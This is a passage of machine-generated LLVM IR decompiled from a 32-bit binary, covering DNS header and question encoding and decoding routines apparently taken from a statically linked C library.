  %v1_805806f = call i32 @__errno_location(i32 %v0_8057eb8)
  store i32 %v1_805806f, i32* %eax.global-to-local, align 4
  %v1_8058074 = inttoptr i32 %v1_805806f to i32*
  store i32 97, i32* %v1_8058074, align 4
  br label %dec_label_pc_805807a

dec_label_pc_805807a:                             ; preds = %dec_label_pc_805804c, %dec_label_pc_805806f
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805807c

dec_label_pc_805807c:                             ; preds = %dec_label_pc_8057fd3, %dec_label_pc_8058059, %dec_label_pc_8057ed0, %dec_label_pc_805807a
  %v0_805807f = phi i32 [ 0, %dec_label_pc_8057fd3 ], [ %v5_8058063, %dec_label_pc_8058059 ], [ %v3_8057edc, %dec_label_pc_8057ed0 ], [ 0, %dec_label_pc_805807a ]
  store i32 %v0_805807f, i32* %eax.global-to-local, align 4
  store i32 %v0_8057eb8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805807f

; uselistorder directives
  uselistorder i32 %v0_805807f, { 1, 0 }
  uselistorder i32 %v0_805803e, { 1, 0 }
  uselistorder i1 %v10_8058029, { 1, 0 }
  uselistorder i32 %v0_8058029.pre, { 1, 0, 2 }
  uselistorder i32 %v1_805801f, { 1, 0, 2 }
  uselistorder i32 %v1_805800b, { 1, 0 }
  uselistorder i32 %v0_8058014, { 3, 2, 0, 1 }
  uselistorder i32 %v2_8057fa0, { 1, 0 }
  uselistorder i32 %v2_8057f99, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.160, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.161, { 2, 1, 0 }
  uselistorder i32 %v0_8057fb262, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8057fa463, { 2, 1, 0 }
  uselistorder i32 %v0_8057fae64, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8057f89, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805802918, { 1, 0 }
  uselistorder i32 %v1_8057f7e, { 1, 0 }
  uselistorder i32 %v0_8057f7e, { 1, 0, 2 }
  uselistorder i32 %v5_8057f86, { 1, 2, 0 }
  uselistorder i32 %v1_8057f61, { 0, 2, 1 }
  uselistorder i32 %v0_8057f519, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8057f5c13, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8057f4c, { 1, 0 }
  uselistorder i32 %v0_8057f7766, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8057f6c67, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8057f6169, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8057f1970, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8057eb8, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 6, 2, 4, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 5, 6, 4, 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @sprintf, { 4, 0, 3, 2, 1 }
  uselistorder [3 x i8]* @global_var_805d491.598, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 64, { 8, 0, 3, 10, 7, 9, 6, 2, 4, 5, 1 }
  uselistorder i32* @esp, { 0, 1, 120, 7, 121, 122, 123, 124, 125, 126, 8, 266, 267, 268, 269, 270, 271, 272, 10, 273, 274, 275, 276, 277, 16, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 12, 288, 289, 290, 13, 291, 9, 292, 293, 294, 295, 296, 297, 14, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 11, 311, 312, 313, 314, 315, 316, 15, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 17, 339, 2, 3, 382, 4, 5, 6, 18, 340, 341, 342, 343, 19, 344, 345, 346, 347, 22, 348, 349, 350, 23, 351, 24, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 21, 365, 25, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 20, 378, 379, 380, 381, 127, 159, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 160, 161, 162, 163, 164, 165, 198, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 264, 265 }
  uselistorder i32 15, { 1, 5, 9, 8, 2, 7, 6, 3, 4, 0 }
  uselistorder i32 60, { 6, 7, 8, 9, 1, 10, 4, 3, 2, 5, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 1, 8, 9, 10, 11, 21, 19, 18, 20, 14, 2, 3, 12, 13, 4, 5, 6, 0, 7, 15, 16, 17 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805807c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_805807a, { 1, 0 }
  uselistorder label %dec_label_pc_805803a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805801f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057fb6, { 1, 0 }
  uselistorder label %dec_label_pc_8057fae, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057f94, { 1, 0 }
  uselistorder label %dec_label_pc_8057f89, { 1, 0 }
  uselistorder label %dec_label_pc_8057f79, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057f75, { 1, 0 }
  uselistorder label %dec_label_pc_8057f61, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8057f5e, { 1, 0 }
  uselistorder label %dec_label_pc_8057f34, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_805808c = load i32, i32* @ebx, align 4
  store i32 %v0_805808c, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_8058096 = ptrtoint i8* %tmp to i32
  store i32 %v4_8058096, i32* %esi.global-to-local, align 4
  %v7_805809a = icmp sgt i32 %tmp9, 11
  br i1 %v7_805809a, label %dec_label_pc_80580a0, label %dec_label_pc_8058134

dec_label_pc_80580a0:                             ; preds = %entry
  %v1_80580a0 = add i32 %tmp8, 1
  %v2_80580a0 = inttoptr i32 %v1_80580a0 to i8*
  %v3_80580a0 = load i8, i8* %v2_80580a0, align 1
  store i8 %v3_80580a0, i8* %tmp, align 1
  %v0_80580a6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580a6 = inttoptr i32 %v0_80580a6 to i32*
  %v2_80580a6 = load i32, i32* %v1_80580a6, align 4
  %v1_80580a8 = trunc i32 %v2_80580a6 to i8
  %v2_80580a8 = load i32, i32* %esi.global-to-local, align 4
  %v3_80580a8 = add i32 %v2_80580a8, 1
  %v4_80580a8 = inttoptr i32 %v3_80580a8 to i8*
  store i8 %v1_80580a8, i8* %v4_80580a8, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_80580cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580cd = add i32 %v0_80580cd, 8
  %v2_80580cd = inttoptr i32 %v1_80580cd to i32*
  %v3_80580cd = load i32, i32* %v2_80580cd, align 4
  %v1_80580d0 = mul i32 %v3_80580cd, 8
  %v2_80580d3 = and i32 %v1_80580d0, 120
  %v2_80580d6 = or i32 %v2_80580d3, 4
  store i32 %v2_80580d6, i32* %edx.global-to-local, align 4
  %v1_80580d8 = add i32 %v0_80580cd, 20
  %v2_80580d8 = inttoptr i32 %v1_80580d8 to i32*
  %v3_80580d8 = load i32, i32* %v2_80580d8, align 4
  %v4_80580d8 = icmp eq i32 %v3_80580d8, 0
  %v1_80580dc = icmp eq i1 %v4_80580d8, false
  %v2_80580dc = zext i1 %v1_80580dc to i32
  %v2_80580df = or i32 %v2_80580dc, %v2_80580d6
  store i32 %v2_80580df, i32* %edx.global-to-local, align 4
  %v2_80580e1 = or i32 %v2_80580df, 130
  %v3_80580e1 = trunc i32 %v2_80580e1 to i8
  store i32 %v2_80580e1, i32* @ecx, align 4
  %v2_80580e3 = load i32, i32* %esi.global-to-local, align 4
  %v3_80580e3 = add i32 %v2_80580e3, 2
  %v4_80580e3 = inttoptr i32 %v3_80580e3 to i8*
  store i8 %v3_80580e1, i8* %v4_80580e3, align 1
  %v0_80580e6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580ea = add i32 %v0_80580e6, 28
  %v2_80580ea = inttoptr i32 %v1_80580ea to i8*
  %v3_80580ea = load i8, i8* %v2_80580ea, align 1
  %v5_80580ea = load i32, i32* %edx.global-to-local, align 4
  %v2_80580f3 = urem i8 %v3_80580ea, 16
  %v7_80580f3 = zext i8 %v2_80580f3 to i32
  %v9_80580f3 = and i32 %v5_80580ea, -256
  %v10_80580f3 = or i32 %v9_80580f3, %v7_80580f3
  store i32 %v10_80580f3, i32* %edx.global-to-local, align 4
  %v2_80580f6 = or i8 %v2_80580f3, -128
  %v2_80580f8 = load i32, i32* %esi.global-to-local, align 4
  %v3_80580f8 = add i32 %v2_80580f8, 3
  %v4_80580f8 = inttoptr i32 %v3_80580f8 to i8*
  store i8 %v2_80580f6, i8* %v4_80580f8, align 1
  %v0_80580fb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80580fb = add i32 %v0_80580fb, 33
  %v2_80580fb = inttoptr i32 %v1_80580fb to i8*
  %v3_80580fb = load i8, i8* %v2_80580fb, align 1
  %v2_80580ff = load i32, i32* %esi.global-to-local, align 4
  %v3_80580ff = add i32 %v2_80580ff, 4
  %v4_80580ff = inttoptr i32 %v3_80580ff to i8*
  store i8 %v3_80580fb, i8* %v4_80580ff, align 1
  %v0_8058102 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058102 = add i32 %v0_8058102, 32
  %v2_8058102 = inttoptr i32 %v1_8058102 to i32*
  %v3_8058102 = load i32, i32* %v2_8058102, align 4
  %v1_8058105 = trunc i32 %v3_8058102 to i8
  %v2_8058105 = load i32, i32* %esi.global-to-local, align 4
  %v3_8058105 = add i32 %v2_8058105, 5
  %v4_8058105 = inttoptr i32 %v3_8058105 to i8*
  store i8 %v1_8058105, i8* %v4_8058105, align 1
  %v0_8058108 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058108 = add i32 %v0_8058108, 37
  %v2_8058108 = inttoptr i32 %v1_8058108 to i8*
  %v3_8058108 = load i8, i8* %v2_8058108, align 1
  %v2_805810c = load i32, i32* %esi.global-to-local, align 4
  %v3_805810c = add i32 %v2_805810c, 6
  %v4_805810c = inttoptr i32 %v3_805810c to i8*
  store i8 %v3_8058108, i8* %v4_805810c, align 1
  %v0_805810f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805810f = add i32 %v0_805810f, 36
  %v2_805810f = inttoptr i32 %v1_805810f to i32*
  %v3_805810f = load i32, i32* %v2_805810f, align 4
  %v1_8058112 = trunc i32 %v3_805810f to i8
  %v2_8058112 = load i32, i32* %esi.global-to-local, align 4
  %v3_8058112 = add i32 %v2_8058112, 7
  %v4_8058112 = inttoptr i32 %v3_8058112 to i8*
  store i8 %v1_8058112, i8* %v4_8058112, align 1
  %v0_8058115 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058115 = add i32 %v0_8058115, 41
  %v2_8058115 = inttoptr i32 %v1_8058115 to i8*
  %v3_8058115 = load i8, i8* %v2_8058115, align 1
  %v2_8058119 = load i32, i32* %esi.global-to-local, align 4
  %v3_8058119 = add i32 %v2_8058119, 8
  %v4_8058119 = inttoptr i32 %v3_8058119 to i8*
  store i8 %v3_8058115, i8* %v4_8058119, align 1
  %v0_805811c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805811c = add i32 %v0_805811c, 40
  %v2_805811c = inttoptr i32 %v1_805811c to i32*
  %v3_805811c = load i32, i32* %v2_805811c, align 4
  %v1_805811f = trunc i32 %v3_805811c to i8
  %v2_805811f = load i32, i32* %esi.global-to-local, align 4
  %v3_805811f = add i32 %v2_805811f, 9
  %v4_805811f = inttoptr i32 %v3_805811f to i8*
  store i8 %v1_805811f, i8* %v4_805811f, align 1
  %v0_8058122 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058122 = add i32 %v0_8058122, 45
  %v2_8058122 = inttoptr i32 %v1_8058122 to i8*
  %v3_8058122 = load i8, i8* %v2_8058122, align 1
  %v2_8058126 = load i32, i32* %esi.global-to-local, align 4
  %v3_8058126 = add i32 %v2_8058126, 10
  %v4_8058126 = inttoptr i32 %v3_8058126 to i8*
  store i8 %v3_8058122, i8* %v4_8058126, align 1
  %v0_8058129 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058129 = add i32 %v0_8058129, 44
  %v2_8058129 = inttoptr i32 %v1_8058129 to i32*
  %v3_8058129 = load i32, i32* %v2_8058129, align 4
  %v1_805812c = trunc i32 %v3_8058129 to i8
  %v2_805812c = load i32, i32* %esi.global-to-local, align 4
  %v3_805812c = add i32 %v2_805812c, 11
  %v4_805812c = inttoptr i32 %v3_805812c to i8*
  store i8 %v1_805812c, i8* %v4_805812c, align 1
  %v2_8058134.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8058134

dec_label_pc_8058134:                             ; preds = %entry, %dec_label_pc_80580a0
  %v2_8058134 = phi i32 [ %v0_805808c, %entry ], [ %v2_8058134.pre, %dec_label_pc_80580a0 ]
  %v0_8058136 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_80580a0 ]
  store i32 %v2_8058134, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8058136

; uselistorder directives
  uselistorder i32 45, { 5, 2, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 2, 1, 3, 0 }
  uselistorder i32 33, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 130, { 1, 2, 0 }
  uselistorder i32 120, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8058134, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8058138 = load i32, i32* @ebx, align 4
  store i32 %v0_8058138, i32* %stack_var_-4, align 4
  %v4_8058139 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8058139, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8058141 = load i8, i8* %tmp2, align 1
  %v3_8058141 = zext i8 %v2_8058141 to i32
  %v1_8058144 = add i32 %v4_8058139, 1
  %v2_8058144 = inttoptr i32 %v1_8058144 to i8*
  %v3_8058144 = load i8, i8* %v2_8058144, align 1
  %v4_8058144 = zext i8 %v3_8058144 to i32
  %v2_8058148 = mul nuw nsw i32 %v3_8058141, 256
  %v2_805814b = or i32 %v4_8058144, %v2_8058148
  %v2_805814d = inttoptr i32 %tmp to i32*
  store i32 %v2_805814b, i32* %v2_805814d, align 4
  %v0_805814f = load i32, i32* @ecx, align 4
  %v1_805814f = add i32 %v0_805814f, 2
  %v2_805814f = inttoptr i32 %v1_805814f to i8*
  %v3_805814f = load i8, i8* %v2_805814f, align 1
  %tmp6 = icmp slt i8 %v3_805814f, 0
  %v2_8058153 = zext i1 %tmp6 to i32
  %v1_8058156 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058156 = add i32 %v1_8058156, 4
  %v3_8058156 = inttoptr i32 %v2_8058156 to i32*
  store i32 %v2_8058153, i32* %v3_8058156, align 4
  %v0_8058159 = load i32, i32* @ecx, align 4
  %v1_8058159 = add i32 %v0_8058159, 2
  %v2_8058159 = inttoptr i32 %v1_8058159 to i8*
  %v3_8058159 = load i8, i8* %v2_8058159, align 1
  %v3_805815c = udiv i8 %v3_8058159, 8
  %tmp7 = urem i8 %v3_805815c, 16
  %v1_805815f = zext i8 %tmp7 to i32
  %v1_8058162 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058162 = add i32 %v1_8058162, 8
  %v3_8058162 = inttoptr i32 %v2_8058162 to i32*
  store i32 %v1_805815f, i32* %v3_8058162, align 4
  %v0_8058165 = load i32, i32* @ecx, align 4
  %v1_8058165 = add i32 %v0_8058165, 2
  %v2_8058165 = inttoptr i32 %v1_8058165 to i8*
  %v3_8058165 = load i8, i8* %v2_8058165, align 1
  %div = udiv i8 %v3_8058165, 4
  %tmp8 = urem i8 %div, 2
  %v1_805816c = zext i8 %tmp8 to i32
  %v1_805816f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805816f = add i32 %v1_805816f, 12
  %v3_805816f = inttoptr i32 %v2_805816f to i32*
  store i32 %v1_805816c, i32* %v3_805816f, align 4
  %v0_8058172 = load i32, i32* @ecx, align 4
  %v1_8058172 = add i32 %v0_8058172, 2
  %v2_8058172 = inttoptr i32 %v1_8058172 to i8*
  %v3_8058172 = load i8, i8* %v2_8058172, align 1
  %div5 = udiv i8 %v3_8058172, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8058178 = zext i8 %tmp9 to i32
  %v1_805817b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805817b = add i32 %v1_805817b, 16
  %v3_805817b = inttoptr i32 %v2_805817b to i32*
  store i32 %v1_8058178, i32* %v3_805817b, align 4
  %v0_805817e = load i32, i32* @ecx, align 4
  %v1_805817e = add i32 %v0_805817e, 2
  %v2_805817e = inttoptr i32 %v1_805817e to i8*
  %v3_805817e = load i8, i8* %v2_805817e, align 1
  %tmp10 = urem i8 %v3_805817e, 2
  %v1_8058182 = zext i8 %tmp10 to i32
  %v1_8058185 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058185 = add i32 %v1_8058185, 20
  %v3_8058185 = inttoptr i32 %v2_8058185 to i32*
  store i32 %v1_8058182, i32* %v3_8058185, align 4
  %v0_8058188 = load i32, i32* @ecx, align 4
  %v1_8058188 = add i32 %v0_8058188, 3
  %v2_8058188 = inttoptr i32 %v1_8058188 to i8*
  %v3_8058188 = load i8, i8* %v2_8058188, align 1
  %tmp11 = icmp slt i8 %v3_8058188, 0
  %v2_805818c = zext i1 %tmp11 to i32
  %v1_805818f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805818f = add i32 %v1_805818f, 24
  %v3_805818f = inttoptr i32 %v2_805818f to i32*
  store i32 %v2_805818c, i32* %v3_805818f, align 4
  %v0_8058192 = load i32, i32* @ecx, align 4
  %v1_8058192 = add i32 %v0_8058192, 3
  %v2_8058192 = inttoptr i32 %v1_8058192 to i8*
  %v3_8058192 = load i8, i8* %v2_8058192, align 1
  %tmp12 = urem i8 %v3_8058192, 16
  %v1_8058196 = zext i8 %tmp12 to i32
  %v1_8058199 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058199 = add i32 %v1_8058199, 28
  %v3_8058199 = inttoptr i32 %v2_8058199 to i32*
  store i32 %v1_8058196, i32* %v3_8058199, align 4
  %v0_805819c = load i32, i32* @ecx, align 4
  %v1_805819c = add i32 %v0_805819c, 4
  %v2_805819c = inttoptr i32 %v1_805819c to i8*
  %v3_805819c = load i8, i8* %v2_805819c, align 1
  %v4_805819c = zext i8 %v3_805819c to i32
  %v1_80581a0 = add i32 %v0_805819c, 5
  %v2_80581a0 = inttoptr i32 %v1_80581a0 to i8*
  %v3_80581a0 = load i8, i8* %v2_80581a0, align 1
  %v4_80581a0 = zext i8 %v3_80581a0 to i32
  %v2_80581a4 = mul nuw nsw i32 %v4_805819c, 256
  %v2_80581a7 = or i32 %v4_80581a0, %v2_80581a4
  %v1_80581a9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80581a9 = add i32 %v1_80581a9, 32
  %v3_80581a9 = inttoptr i32 %v2_80581a9 to i32*
  store i32 %v2_80581a7, i32* %v3_80581a9, align 4
  %v0_80581ac = load i32, i32* @ecx, align 4
  %v1_80581ac = add i32 %v0_80581ac, 6
  %v2_80581ac = inttoptr i32 %v1_80581ac to i8*
  %v3_80581ac = load i8, i8* %v2_80581ac, align 1
  %v4_80581ac = zext i8 %v3_80581ac to i32
  %v1_80581b0 = add i32 %v0_80581ac, 7
  %v2_80581b0 = inttoptr i32 %v1_80581b0 to i8*
  %v3_80581b0 = load i8, i8* %v2_80581b0, align 1
  %v4_80581b0 = zext i8 %v3_80581b0 to i32
  %v2_80581b4 = mul nuw nsw i32 %v4_80581ac, 256
  %v2_80581b7 = or i32 %v4_80581b0, %v2_80581b4
  %v1_80581b9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80581b9 = add i32 %v1_80581b9, 36
  %v3_80581b9 = inttoptr i32 %v2_80581b9 to i32*
  store i32 %v2_80581b7, i32* %v3_80581b9, align 4
  %v0_80581bc = load i32, i32* @ecx, align 4
  %v1_80581bc = add i32 %v0_80581bc, 8
  %v2_80581bc = inttoptr i32 %v1_80581bc to i8*
  %v3_80581bc = load i8, i8* %v2_80581bc, align 1
  %v4_80581bc = zext i8 %v3_80581bc to i32
  %v1_80581c0 = add i32 %v0_80581bc, 9
  %v2_80581c0 = inttoptr i32 %v1_80581c0 to i8*
  %v3_80581c0 = load i8, i8* %v2_80581c0, align 1
  %v4_80581c0 = zext i8 %v3_80581c0 to i32
  %v2_80581c4 = mul nuw nsw i32 %v4_80581bc, 256
  %v2_80581c7 = or i32 %v4_80581c0, %v2_80581c4
  %v1_80581c9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80581c9 = add i32 %v1_80581c9, 40
  %v3_80581c9 = inttoptr i32 %v2_80581c9 to i32*
  store i32 %v2_80581c7, i32* %v3_80581c9, align 4
  %v0_80581cc = load i32, i32* @ecx, align 4
  %v1_80581cc = add i32 %v0_80581cc, 10
  %v2_80581cc = inttoptr i32 %v1_80581cc to i8*
  %v3_80581cc = load i8, i8* %v2_80581cc, align 1
  %v4_80581cc = zext i8 %v3_80581cc to i32
  %v1_80581d0 = add i32 %v0_80581cc, 11
  %v2_80581d0 = inttoptr i32 %v1_80581d0 to i8*
  %v3_80581d0 = load i8, i8* %v2_80581d0, align 1
  %v4_80581d0 = zext i8 %v3_80581d0 to i32
  %v2_80581d4 = mul nuw nsw i32 %v4_80581cc, 256
  %v2_80581d7 = or i32 %v4_80581d0, %v2_80581d4
  %v1_80581d9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80581d9 = add i32 %v1_80581d9, 44
  %v3_80581d9 = inttoptr i32 %v2_80581d9 to i32*
  store i32 %v2_80581d7, i32* %v3_80581d9, align 4
  %v2_80581e1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80581e1, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 10, 11, 4, 5, 9, 17, 6, 12, 13, 14, 15, 7, 16, 3, 8, 0, 2, 1 }
  uselistorder i32 7, { 12, 13, 3, 8, 4, 2, 9, 14, 15, 16, 17, 18, 5, 0, 11, 6, 7, 10, 1 }
  uselistorder i32 6, { 25, 26, 0, 1, 10, 27, 4, 19, 11, 12, 8, 29, 13, 28, 5, 6, 3, 7, 9, 14, 15, 23, 16, 17, 18, 20, 21, 22, 24, 2 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 22, 6, 0, 26, 23, 7, 8, 9, 10, 11, 24, 25, 12, 18, 13, 19, 14, 20, 21, 15, 17, 16 }
  uselistorder i8 16, { 0, 1, 2, 6, 7, 8, 4, 5, 3 }
  uselistorder i8 8, { 0, 3, 8, 4, 5, 6, 7, 1, 2 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80581e4 = load i32, i32* @edi, align 4
  %v0_80581e5 = load i32, i32* @esi, align 4
  %v0_80581e6 = load i32, i32* @ebx, align 4
  store i32 %v0_80581e6, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_80581f3 = load i32, i32* @eax, align 4
  %v1_80581f6 = inttoptr i32 %tmp to i32*
  %v2_80581f6 = load i32, i32* %v1_80581f6, align 4
  %v7_80581f8 = inttoptr i32 %v2_80581f6 to i8*
  %v8_80581f8 = call i32 @__encode_dotted(i8* %v7_80581f8, i32 %tmp2, i32 %tmp3, i32 %v0_80581f3, i32 %v0_80581e6, i32 %v0_80581e5, i32 %v0_80581e4)
  %v2_8058200 = icmp slt i32 %v8_80581f8, 0
  store i32 %v8_80581f8, i32* @ecx, align 4
  br i1 %v2_8058200, label %dec_label_pc_8058231, label %dec_label_pc_8058206

dec_label_pc_8058206:                             ; preds = %entry
  %v0_8058206 = load i32, i32* @ebx, align 4
  %v2_8058206 = sub i32 %v0_8058206, %v8_80581f8
  %v1_8058208 = add i32 %v2_8058206, -3
  %v6_8058208 = sub i32 2, %v2_8058206
  %v7_8058208 = and i32 %v6_8058208, %v2_8058206
  %v8_8058208 = icmp slt i32 %v7_8058208, 0
  %v9_8058208 = icmp eq i32 %v1_8058208, 0
  %v10_8058208 = icmp slt i32 %v1_8058208, 0
  %v3_805820b = icmp eq i1 %v10_8058208, %v8_8058208
  %v4_805820b = icmp eq i1 %v9_8058208, false
  %v5_805820b = and i1 %v4_805820b, %v3_805820b
  br i1 %v5_805820b, label %dec_label_pc_8058212, label %dec_label_pc_805820d

dec_label_pc_805820d:                             ; preds = %dec_label_pc_8058206
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8058231

dec_label_pc_8058212:                             ; preds = %dec_label_pc_8058206
  %v0_8058212 = load i32, i32* @edi, align 4
  %v2_8058212 = add i32 %v0_8058212, %v8_80581f8
  store i32 %v2_8058212, i32* @edx, align 4
  %v0_8058215 = load i32, i32* @esi, align 4
  %v1_8058215 = add i32 %v0_8058215, 5
  %v2_8058215 = inttoptr i32 %v1_8058215 to i8*
  %v3_8058215 = load i8, i8* %v2_8058215, align 1
  %v1_8058219 = add i32 %v8_80581f8, 4
  store i32 %v1_8058219, i32* @ecx, align 4
  %v3_805821c = inttoptr i32 %v2_8058212 to i8*
  store i8 %v3_8058215, i8* %v3_805821c, align 1
  %v0_805821e = load i32, i32* @esi, align 4
  %v1_805821e = add i32 %v0_805821e, 4
  %v2_805821e = inttoptr i32 %v1_805821e to i32*
  %v3_805821e = load i32, i32* %v2_805821e, align 4
  %v1_8058221 = trunc i32 %v3_805821e to i8
  %v2_8058221 = load i32, i32* @edx, align 4
  %v3_8058221 = add i32 %v2_8058221, 1
  %v4_8058221 = inttoptr i32 %v3_8058221 to i8*
  store i8 %v1_8058221, i8* %v4_8058221, align 1
  %v0_8058224 = load i32, i32* @esi, align 4
  %v1_8058224 = add i32 %v0_8058224, 9
  %v2_8058224 = inttoptr i32 %v1_8058224 to i8*
  %v3_8058224 = load i8, i8* %v2_8058224, align 1
  %v2_8058228 = load i32, i32* @edx, align 4
  %v3_8058228 = add i32 %v2_8058228, 2
  %v4_8058228 = inttoptr i32 %v3_8058228 to i8*
  store i8 %v3_8058224, i8* %v4_8058228, align 1
  %v0_805822b = load i32, i32* @esi, align 4
  %v1_805822b = add i32 %v0_805822b, 8
  %v2_805822b = inttoptr i32 %v1_805822b to i32*
  %v3_805822b = load i32, i32* %v2_805822b, align 4
  %v1_805822e = trunc i32 %v3_805822b to i8
  %v2_805822e = load i32, i32* @edx, align 4
  %v3_805822e = add i32 %v2_805822e, 3
  %v4_805822e = inttoptr i32 %v3_805822e to i8*
  store i8 %v1_805822e, i8* %v4_805822e, align 1
  %v0_8058232.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8058231

